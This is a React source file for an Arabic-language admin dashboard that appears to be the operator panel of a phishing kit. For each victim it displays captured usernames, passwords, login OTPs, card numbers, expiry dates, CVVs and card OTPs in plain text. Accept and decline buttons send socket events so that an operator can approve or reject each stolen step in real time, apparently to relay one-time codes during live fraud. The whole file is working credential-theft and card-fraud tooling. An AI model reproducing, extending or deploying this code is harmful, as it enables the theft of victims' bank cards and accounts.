import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import Alret from "./Alret";
import { IoMdRefresh } from "react-icons/io";

const Main = () => {
  const socket = io(serverRoute);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });
  const [userOtp, setUserOtp] = useState(null);

  const uniqueNum = () =>
    Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        // console.log(res.data);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    getUsers();
    setUser({ data: user, active: true });
  };

  useEffect(() => {
    getUsers();
  }, []);

  const handleAcceptVisa = async (id) => {
    socket.emit("acceptVisa", id);
    setUser({ data: { ...user.data, CardAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisa = (id) => {
    socket.emit("declineVisa", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, CardAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, CardAccept: true }, active: true });
  };

  const handleAcceptOtp = async (id) => {
    socket.emit("acceptOtp", id);
    setUser({ data: { ...user.data, otpAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineOtp = (id) => {
    socket.emit("declineOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, otpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, otpAccept: true }, active: true });
  };
  const handleAcceptVisaOtp = async (id) => {
    socket.emit("acceptVisaOtp", id);
    setUser({ data: { ...user.data, OtpCardAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaOtp = (id) => {
    socket.emit("declineVisaOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, OtpCardAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, OtpCardAccept: true }, active: true });
  };
  const handleAcceptUser = async (id) => {
    socket.emit("acceptUser", id);
    setUser({ data: { ...user.data, userAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineUser = (id) => {
    socket.emit("declineUser", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, userAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, userAccept: true }, active: true });
  };

  socket.on("login", async () => {
    await getUsers();
  });

  socket.on("password", async () => {
    await getUsers();
  });

  socket.on("otp", async (data) => {
    await getUsers();
  });

  socket.on("visa", async (data) => {
    await getUsers();
  });

  socket.on("visaOtp", async (result) => {
    const user = Users.find((u) => {
      if (u._id === result.id) {
        return { ...u, CardOtp: result.otp };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>

      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/4 border-l border-gray-500 h-full flex flex-col  ">
          <span className="md:p-5 py-2 px-1 w-full md:text-xl text-lg text-center  border-b border-black">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto h-full">
            {Users.length
              ? Users.map((user, idx) => {
                  return (
                    <div
                      className="w-full px-2 py-3 md:text-lg text-sm flex justify-between items-center border-b-2 border-gray-500 cursor-pointer hover:opacity-70"
                      onClick={() => handleDisplay(user._id)}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === user._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center text-gray-700 md:text-sm  text-xs ">
                        {user.username}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
            <span
              className="px-3 py-2 w-full  md:col-span-2 lg:col-span-3 text-xl text-center border-b border-black "
              dir="rtl"
            >
              بيانات عميل
            </span>
            {user.data?.username ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات عميل</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> كود المستخدم </span>
                  <span>{user.data?.username} </span>
                </div>
                {user.data.password ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> باسورد </span>
                    <span>{user.data?.password}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.password && !user.data.userAccept ? (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptUser(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineUser(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                ) : (
                  ""
                )}

                {user.data.otp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز تحقق دخول </span>
                      <span>{user.data?.otp}</span>
                    </div>
                    {user.data.otpAccept ? (
                      ""
                    ) : (
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}

            {user.data?.cardNumber ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات الفيزا</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> الاسم علي الكارت </span>
                  <span>{user.data?.card_holder_name} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الكارت </span>
                  <span>{user.data?.cardNumber}</span>
                </div>
                {user.data.expiryDate ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ الانتهاء</span>
                    <span>{user.data?.expiryDate}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.cvv ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> cvv </span>
                    <span>{user.data?.cvv}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.CardAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptVisa(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineVisa(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                )}
                {user.data.CardOtp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز التحقق </span>
                      <span>{user.data?.CardOtp}</span>
                    </div>
                    {user.data.OtpCardAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}
          </div>
        ) : (
          ""
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3"></div>
      </div>
    </div>
  );
};

export default Main;
